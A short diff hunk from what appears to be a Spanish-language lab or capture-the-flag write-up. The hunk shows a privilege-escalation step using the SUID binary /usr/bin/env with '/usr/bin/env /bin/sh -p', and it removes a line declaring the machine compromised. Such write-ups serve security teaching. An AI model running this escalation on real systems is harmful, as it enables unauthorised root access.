@@ -88,8 +88,6 @@ hay nodos intermediarias por la cual pasa nuestra petición para poder tener com
 * <p> Escalamos privilegios con el binario /usr/bin/env </p>
 > /usr/bin/env /bin/sh -p
 <img src="/imgs/anonymous/anonymous15.jpg"/>
-<p>OK maquina vulnerada</p>
-
 
 
 
